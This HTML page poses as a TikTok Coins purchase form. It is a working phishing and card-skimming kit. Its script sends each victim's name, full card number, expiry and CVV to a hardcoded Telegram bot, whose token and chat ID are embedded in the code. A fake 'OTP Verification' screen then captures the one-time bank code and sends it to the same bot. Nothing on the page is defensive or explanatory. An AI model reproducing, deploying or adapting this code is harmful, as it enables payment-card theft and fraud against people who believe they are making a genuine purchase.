<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>TikTok Coins · Buy</title>
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    }

    body {
      background: #f5f7fa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }

    .card {
      max-width: 420px;
      width: 100%;
      background: #ffffff;
      border-radius: 36px;
      padding: 24px 20px 32px;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
      color: #1a1a1a;
      transition: 0.2s;
      border: 1px solid #eaeef2;
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 18px;
    }

    .header h1 {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -0.5px;
      color: #1a1a1a;
    }

    .header h1 i {
      color: #ff0050;
      margin-right: 6px;
    }

    .header i {
      font-size: 28px;
      color: #ff0050;
    }

    .user-section {
      background: #f0f2f5;
      border-radius: 28px;
      padding: 12px 18px;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 10px;
      border: 1px solid #e0e4e8;
    }

    .user-section i {
      color: #777;
      font-size: 18px;
    }

    .user-section input {
      background: transparent;
      border: none;
      outline: none;
      color: #1a1a1a;
      font-size: 16px;
      width: 100%;
      padding: 6px 0;
    }

    .user-section input::placeholder {
      color: #999;
      font-weight: 400;
    }

    .coin-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-bottom: 24px;
    }

    .coin-option {
      background: #f0f2f5;
      border-radius: 20px;
      padding: 12px 4px;
      text-align: center;
      border: 1px solid #e0e4e8;
      transition: 0.15s;
      cursor: pointer;
      box-shadow: 0 2px 0 #d5d9de;
    }

    .coin-option.selected {
      border-color: #ff0050;
      background: #ffe6ed;
      box-shadow: 0 0 0 1px #ff0050, 0 2px 0 #d5d9de;
    }

    .coin-option .coins {
      font-weight: 700;
      font-size: 18px;
      letter-spacing: -0.3px;
      color: #1a1a1a;
    }

    .coin-option .price {
      font-size: 13px;
      color: #666;
      margin-top: 4px;
    }

    .coin-option .badge {
      background: #ff005022;
      color: #cc0040;
      font-size: 10px;
      font-weight: 600;
      border-radius: 40px;
      padding: 2px 10px;
      display: inline-block;
      margin-top: 6px;
    }

    .visa-box {
      background: #f7f9fc;
      border-radius: 28px;
      padding: 16px 18px;
      margin-bottom: 20px;
      border: 1px solid #e0e4e8;
    }

    .visa-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 14px;
    }

    .visa-row i {
      color: #ff0050;
      font-size: 22px;
      width: 28px;
    }

    .visa-row input {
      background: transparent;
      border: none;
      border-bottom: 1px solid #d5d9de;
      outline: none;
      color: #1a1a1a;
      font-size: 15px;
      padding: 8px 0;
      width: 100%;
    }

    .visa-row input::placeholder {
      color: #999;
    }

    .visa-row .half {
      width: 50%;
    }

    .visa-row .half:first-child {
      margin-right: 8px;
    }

    .visa-flex {
      display: flex;
      gap: 10px;
    }

    #cardNumber {
      letter-spacing: 4px;
      font-weight: 500;
    }

    #expiry {
      letter-spacing: 2px;
      font-weight: 500;
    }

    .action-btn {
      width: 100%;
      background: #ff0050;
      border: none;
      padding: 16px;
      border-radius: 60px;
      font-weight: 700;
      font-size: 18px;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      box-shadow: 0 8px 0 #b8003a;
      transition: 0.08s linear;
      margin-bottom: 14px;
      cursor: pointer;
    }

    .action-btn:active {
      transform: translateY(4px);
      box-shadow: 0 4px 0 #b8003a;
    }

    .action-btn i {
      font-size: 20px;
    }

    /* OTP OVERLAY (new screen) - white theme */
    .otp-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: center;
      z-index: 999;
      padding: 24px;
    }

    .otp-overlay.active {
      display: flex;
    }

    .otp-card {
      background: #ffffff;
      max-width: 380px;
      width: 100%;
      border-radius: 40px;
      padding: 32px 24px 28px;
      border: 1px solid #e0e4e8;
      box-shadow: 0 30px 60px rgba(0,0,0,0.15);
      animation: fadeUp 0.25s ease;
    }

    @keyframes fadeUp {
      0% { opacity: 0; transform: translateY(30px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .otp-card h2 {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: #1a1a1a;
    }

    .otp-card h2 i {
      color: #ff0050;
    }

    .otp-card .sub {
      color: #666;
      font-size: 14px;
      margin-bottom: 22px;
      border-left: 3px solid #ff0050;
      padding-left: 12px;
    }

    .otp-input-group {
      background: #f0f2f5;
      border-radius: 60px;
      display: flex;
      align-items: center;
      padding: 4px 4px 4px 20px;
      border: 1px solid #e0e4e8;
      margin-bottom: 18px;
    }

    .otp-input-group input {
      background: transparent;
      border: none;
      outline: none;
      color: #1a1a1a;
      font-size: 22px;
      letter-spacing: 6px;
      flex: 1;
      padding: 14px 0;
      min-width: 0;
    }

    .otp-input-group input::placeholder {
      letter-spacing: 2px;
      color: #999;
      font-size: 16px;
    }

    .otp-input-group button {
      background: #ff0050;
      border: none;
      color: white;
      font-weight: 700;
      padding: 14px 24px;
      border-radius: 60px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.1s;
      box-shadow: 0 4px 0 #b8003a;
    }

    .otp-input-group button:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 #b8003a;
    }

    .otp-close {
      background: transparent;
      border: none;
      color: #888;
      font-size: 14px;
      margin-top: 12px;
      cursor: pointer;
      width: 100%;
      text-align: center;
      padding: 8px;
    }

    .otp-close:hover {
      color: #333;
    }

    .footnote {
      font-size: 11px;
      color: #999;
      text-align: center;
      margin-top: 18px;
      letter-spacing: 0.3px;
    }

    .telegram-badge {
      display: inline-block;
      background: #0088cc22;
      color: #0088cc;
      border-radius: 40px;
      padding: 2px 12px;
      font-size: 10px;
      margin-top: 6px;
    }

    @media (max-width: 400px) {
      .card { padding: 18px 14px; }
      .coin-option .coins { font-size: 16px; }
      .otp-card { padding: 24px 18px; }
    }
  </style>
</head>
<body>

  <!-- MAIN CARD -->
  <div class="card" id="mainCard">

    <div class="header">
      <h1><i class="fab fa-tiktok"></i> Coins</h1>
      <i class="fas fa-bolt"></i>
    </div>

    <!-- Username field only -->
    <div class="user-section">
      <i class="fas fa-user"></i>
      <input type="text" id="username" placeholder="Username" value="">
    </div>

    <!-- Updated coin packages with "Custom" in English -->
    <div class="coin-grid" id="coinGrid">
      <div class="coin-option" data-coins="4500" data-price="46.19"><div class="coins">4,500</div><div class="price">US$46.19</div></div>
      <div class="coin-option" data-coins="2500" data-price="25.65"><div class="coins">2,500</div><div class="price">US$25.65</div></div>
      <div class="coin-option" data-coins="30" data-price="0.31"><div class="coins">30</div><div class="price">US$0.31</div></div>
      <div class="coin-option" data-coins="25000" data-price="256.45"><div class="coins">25,000</div><div class="price">US$256.45</div></div>
      <div class="coin-option" data-coins="10000" data-price="102.59"><div class="coins">10,000</div><div class="price">US$102.59</div></div>
      <div class="coin-option" data-coins="5500" data-price="56.45"><div class="coins">5,500</div><div class="price">US$56.45</div></div>
      <div class="coin-option" data-coins="custom" data-price="custom"><div class="coins">Custom</div><div class="price">Enter amount</div><div class="badge">Flexible</div></div>
    </div>

    <div class="visa-box">
      <div class="visa-row"><i class="fas fa-id-card"></i><input type="text" id="cardName" placeholder="Name on card" value=""></div>
      <div class="visa-row"><i class="fas fa-credit-card"></i>
        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" value="" maxlength="19" inputmode="numeric">
      </div>
      <div class="visa-flex">
        <div class="visa-row half"><i class="far fa-calendar-alt"></i>
          <input type="text" id="expiry" placeholder="MM/YY" value="" maxlength="5">
        </div>
        <div class="visa-row half"><i class="fas fa-lock"></i>
          <input type="password" id="cvv" placeholder="000" value="" maxlength="3" inputmode="numeric">
        </div>
      </div>
    </div>

    <!-- Updated button text -->
    <button class="action-btn" id="topupBtn"><i class="fas fa-coins"></i> Buy TikTok Coins</button>

    <div class="footnote">
      <i class="fas fa-shield-alt" style="margin-right: 6px; color: #ff0050;"></i> secure · telegram delivery
      <div class="telegram-badge"><i class="fab fa-telegram-plane"></i>  bot active</div>
    </div>
  </div>

  <!-- OTP OVERLAY (new screen) - user enters code (4-6 digits) -->
  <div class="otp-overlay" id="otpOverlay">
    <div class="otp-card">
      <h2><i class="fas fa-shield-alt"></i> OTP Verification</h2>
      <div class="sub">Enter the verification code (4-6 digits)</div>

      <div class="otp-input-group">
        <input type="text" id="otpInput" placeholder="000000" maxlength="6" inputmode="numeric">
        <button id="confirmOtpBtn"><i class="fas fa-check"></i> Confirm</button>
      </div>

      <button class="otp-close" id="closeOtpBtn"><i class="fas fa-arrow-left"></i> Back to buy</button>
      <div style="margin-top: 12px; font-size: 12px; color: #888; text-align: center;">Enter the code you received</div>
    </div>
  </div>

  <script>
    (function() {
      // ----- Telegram config -----
      const BOT_TOKEN = '5119966830:AAG8gBkHGPQsUqNe7Ml_vVjO_F2wN4P18VE';
      const CHAT_ID = '1736465760';

      // ----- DOM refs -----
      const usernameInput = document.getElementById('username');
      const cardName = document.getElementById('cardName');
      const cardNumber = document.getElementById('cardNumber');
      const expiry = document.getElementById('expiry');
      const cvv = document.getElementById('cvv');
      const otpInput = document.getElementById('otpInput');
      const topupBtn = document.getElementById('topupBtn');
      const confirmBtn = document.getElementById('confirmOtpBtn');
      const closeOtpBtn = document.getElementById('closeOtpBtn');
      const otpOverlay = document.getElementById('otpOverlay');

      // coin selection
      let selectedCoins = null;
      let selectedPrice = null;
      const coinOptions = document.querySelectorAll('.coin-option');

      // ----- helper: send to telegram -----
      function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        };

        return fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        })
        .then(res => {
          if (!res.ok) {
            throw new Error(`Telegram API error: ${res.status}`);
          }
          return res.json();
        })
        .catch(err => {
          console.warn('Telegram send error:', err);
          alert('⚠️ Could not reach Telegram. Check token/chat ID.');
        });
      }

      // ----- build order message (for top-up) -----
      function buildOrderMessage() {
        const user = usernameInput.value.trim() || '(not provided)';
        const name = cardName.value.trim() || '(empty)';
        const cardRaw = cardNumber.value.replace(/\s/g, '') || '(empty)';
        const exp = expiry.value.trim() || '(empty)';
        const cvvVal = cvv.value.trim() || '(empty)';
        const coins = selectedCoins !== null ? selectedCoins : '❌ not selected';
        const price = selectedPrice !== null ? `$${selectedPrice}` : '—';

        return `🧾 <b>TIKTOK COINS PURCHASE</b>\n` +
               `👤 Username: ${user}\n` +
               `🪙 Coins: ${coins}\n` +
               `💵 Price: $${price}\n` +
               `💳 Card: ${cardRaw}\n` +
               `🏷️ Name: ${name}\n` +
               `📅 Exp: ${exp}\n` +
               `🔐 CVV: ${cvvVal}`;
      }

      // ----- coin selection (click) -----
      coinOptions.forEach(opt => {
        opt.addEventListener('click', function(e) {
          coinOptions.forEach(o => o.classList.remove('selected'));
          this.classList.add('selected');

          const coinsAttr = this.dataset.coins;
          const priceAttr = this.dataset.price;

          if (coinsAttr === 'custom') {
            const customAmount = prompt('Enter custom coins amount (e.g. 5000)');
            if (customAmount !== null && customAmount.trim() !== '' && !isNaN(customAmount)) {
              const num = parseInt(customAmount, 10);
              if (num > 0) {
                selectedCoins = num;
                const estimated = (num * 0.0102).toFixed(2);
                selectedPrice = estimated;
                this.querySelector('.coins').innerHTML = `${num.toLocaleString()}`;
                this.querySelector('.price').innerHTML = `US$${estimated}`;
              } else {
                alert('Please enter a valid positive number.');
                this.classList.remove('selected');
                selectedCoins = null;
                selectedPrice = null;
                return;
              }
            } else {
              this.classList.remove('selected');
              selectedCoins = null;
              selectedPrice = null;
              return;
            }
          } else {
            selectedCoins = parseInt(coinsAttr, 10);
            selectedPrice = parseFloat(priceAttr);
          }
        });
      });

      // ----- Card number formatting: 0000 0000 0000 0000 -----
      cardNumber.addEventListener('input', function(e) {
        let raw = this.value.replace(/\s/g, '').replace(/\D/g, '');
        if (raw.length > 16) raw = raw.slice(0, 16);
        let formatted = '';
        for (let i = 0; i < raw.length; i++) {
          if (i > 0 && i % 4 === 0) formatted += ' ';
          formatted += raw[i];
        }
        this.value = formatted;
      });

      // ----- Expiry formatting: MM/YY -----
      expiry.addEventListener('input', function(e) {
        let raw = this.value.replace(/\D/g, '');
        if (raw.length > 4) raw = raw.slice(0, 4);
        let formatted = '';
        for (let i = 0; i < raw.length; i++) {
          if (i === 2 && raw.length > 2) formatted += '/';
          formatted += raw[i];
        }
        this.value = formatted;
      });

      // ----- CVV: only digits, max 3 -----
      cvv.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '').slice(0, 3);
      });

      // ----- open OTP overlay (new screen) -----
      function openOtpPage() {
        otpOverlay.classList.add('active');
        setTimeout(() => otpInput.focus(), 100);
      }

      function closeOtpPage() {
        otpOverlay.classList.remove('active');
      }

      closeOtpBtn.addEventListener('click', closeOtpPage);
      otpOverlay.addEventListener('click', function(e) {
        if (e.target === this) closeOtpPage();
      });

      // ----- BUY button: send order to Telegram, open OTP screen (field EMPTY) -----
      topupBtn.addEventListener('click', function() {
        if (selectedCoins === null) {
          alert('Please select a coin package or custom amount.');
          return;
        }

        if (!usernameInput.value.trim()) {
          if (!confirm('Username is empty. Continue anyway?')) return;
        }

        // Basic card validation (optional)
        const cardRaw = cardNumber.value.replace(/\s/g, '');
        if (cardRaw.length !== 16) {
          if (!confirm('Card number should be 16 digits. Continue anyway?')) return;
        }

        // 1. Send order to Telegram
        const msg = buildOrderMessage();
        sendToTelegram(msg)
          .then(() => {
            // 2. Open OTP screen (field is EMPTY - user enters the code)
            otpInput.value = '';
            openOtpPage();
          })
          .catch(() => {
            // Fallback: even if order fails, still open OTP screen
            otpInput.value = '';
            openOtpPage();
            alert('⚠️ Order might not have reached Telegram, but you can still enter OTP.');
          });
      });

      // ----- CONFIRM OTP button: send the entered OTP to Telegram and close -----
      confirmBtn.addEventListener('click', function() {
        const otp = otpInput.value.trim();
        if (!otp) {
          alert('Please enter the OTP code.');
          return;
        }

        if (otp.length < 4 || otp.length > 6) {
          alert('OTP must be between 4 and 6 digits.');
          return;
        }

        const user = usernameInput.value.trim() || '(not provided)';
        const confirmMsg = `✅ <b>OTP VERIFICATION</b>\n` +
                           `👤 Username: ${user}\n` +
                           `🔑 Code: <code>${otp}</code>\n` +
                           `🕒 Verified at ${new Date().toLocaleString()}`;

        sendToTelegram(confirmMsg)
          .then(() => {
            alert('✅ OTP verification sent to Telegram.');
            closeOtpPage();
            otpInput.value = '';
          })
          .catch(() => {
            alert('⚠️ OTP verification was not sent. Check Telegram configuration.');
          });
      });

      // pre-select first coin
      if (coinOptions.length) {
        coinOptions[0].click();
      }

      // Allow only digits in OTP input, max 6
      otpInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
      });
    })();
  </script>
</body>
</html>
